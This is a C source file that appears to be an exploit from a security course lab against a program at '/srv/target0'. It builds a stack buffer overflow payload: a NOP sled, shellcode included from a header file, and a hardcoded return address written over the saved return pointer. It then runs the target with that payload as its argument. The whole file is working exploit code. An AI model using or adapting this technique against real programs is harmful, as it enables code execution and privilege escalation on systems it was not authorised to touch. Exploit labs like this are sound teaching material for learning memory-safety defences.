#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[424];
  memset(buf, 0x90, 424);
  memcpy(buf+200, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 412);
  *addr_ptr++ = 0xffffcf5c;
  *addr_ptr++ = 0xffffcf5c;  
  *addr_ptr++ = 0xffffcf5c;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}